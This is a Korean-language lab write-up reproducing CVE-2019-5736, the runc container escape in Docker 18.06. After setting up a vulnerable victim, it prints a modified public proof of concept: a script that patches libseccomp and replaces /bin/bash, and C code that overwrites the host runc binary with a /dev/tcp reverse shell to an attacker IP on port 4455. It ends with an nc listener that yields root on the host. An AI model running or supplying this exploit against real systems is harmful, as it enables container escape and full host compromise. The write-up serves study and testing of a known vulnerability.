
# 취약점 설명

CVE-2019-5736취약점은
도커 컨테이너 CLI 툴인 runc에서 발생한다.


컨테이너 내에서 실행되는 프로세스들은 호스트 시스템의 파일 디스크립터를 공유하여 사용한다. 

그러나 runC는 호스트 시스템에서 파일 디스크립터를 다시 열고 그것을 컨테이너 내의 프로세스에 전달하는 기능을 가지고 있다. 

이 과정에서 파일 디스크립터를 전달 받은 프로세스는 그 파일 디스크립터가 소유하는 파일에 대한 제어 권한을 가지게 되는데, 

이때 runC가 제공하는 파일 디스크립터 전달 방식의 버그로 인해, 컨테이너 내부의 악성 코드가 호스트 시스템의 파일 디스크립터를 이용하여 

호스트 시스템에서 원하는 동작을 수행할 수 있게 된다  

   
  
</br>
</br>
</br>
  
# 취약점 구현

## 구현 환경 
### 희생자: Ubuntu 18.04, Docker-ce 18.06.1~ce~3-0~ubuntu
### 공격자: Ubuntu 16.04


희생자 PC에 Docker을 설치한다.

설치 과정은 Docker 공식 문서를 따르며 버전을 지정하여 설치한다.
</br>
</br>
      $sudo apt-get update
      $sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common
      $curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
      $sudo add-apt-repository \
      "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
      $sudo apt-get update
</br>
</br>      
apt-cache madison 명령어를 통해 repository에서 설치 가능한 Docker 버전을 확인할 수 있다.

      $sudo apt-cache madison docker-ce
      $sudo apt-get install docker-ce=18.06.1~ce~3-0~ubuntu
</br>
</br>
취약점 구현을 위해 Docker 버전을 18.06 버전으로 설치한다.

      $cat <<EOF | sudo tee /etc/docker/daemon.json
      {
       "exec-opts": ["native.cgroupdriver=systemd"],
        "log-driver": "json-file",
        "log-opts": {
          "max-size": "100m"
        },
        "storage-driver": "overlay2"
      }
      EOF
      
      
      $sudo systemctl daemon-reload
      $sudo systemctl restart docker.service
</br>
</br>

      $git clone https://github.com/agppp/cve-2019-5736-poc

공개된 poc 코드를 다운받는다.


poc코드를 현재 host pc 환경에 맞게 수정한다.

</br>
</br>
run.sh
libseccomp 버전을 host pc 버전에 맞게 설정한다.

</br>
</br>
      #!/bin/bash
      cd /root/libseccomp-2.5.1
      cat /root/stage1.c >> src/api.c
      DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us
      dpkg -i /root/*.deb
      mv /bin/bash /bin/good_bash
      gcc /root/stage2.c -o /stage2
      cat >/bin/bash <<EOF
      #!/proc/self/exe
      EOF
      chmod +x /bin/bash
                           
stage2.c
                           
#include <string.h>

#include <unistd.h>            
를 추가하고 아이피를 공격자 아이피로 설정한다.
</br>
</br>
      #include <stdio.h>
      #include <sys/types.h>
      #include <sys/stat.h>
      #include <fcntl.h>
      #include <errno.h>
      #include <string.h>
      #include <unistd.h>
      int main(int argc, char **argv) {

          printf("HAX2: argv: %s\n", argv[1]);
          int res1 = -1;
          int total = 10000;
          while(total>0 && res1== -1){

              int fd = open(argv[1], O_RDWR|O_TRUNC);
              printf("HAX2: fd: %d\n", fd);




              const char *poc = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.100.12/4455 0>&1  &\n";
              int res = write(fd, poc, strlen(poc));
              printf("HAX2: res: %d, %d\n", res, errno);
              res1 = res;
              total--;
          }
      }
      
</br>
</br>
설정한 파일들을 토대로 Dockerfile을 통해 이미지를 빌드한다.
</br>
</br>
      $docker build -t cve .
</br>
</br>
빌드한 이미지를 통해 컨테이너를 만든다.
</br>
</br>
      $docker run -t -d --name cvetest cve
</br>
</br>      
테스트 진행 후 파일이 변경되므로 미리 백업을 한다
</br>
</br>
      $sudo cp /usr/bin/docker-runc /usr/bin/docker-runc.bak
</br>
</br>     
올라간 컨테이너에 접속하여 파일을 실행한다
</br>
</br>
      $docker exec -it cvetest /bin/sh
      $cd /root && ./run.sh && exit
      
</br>
</br>
공격자 pc에서 port 4455번에 대해 listen상태를 활성화 시킨다
</br>
</br>
      $nc -nlvvp 4455
</br>
</br>      
희생자 pc에서 다시 한번 컨테이너에 파일을 실행시킨다
</br>
</br>
      $docker exec -it cvetest /bin/bash
</br>
</br>     
공격자 pc에서 희생자 pc의 루트 권한으로 접속하게 된다
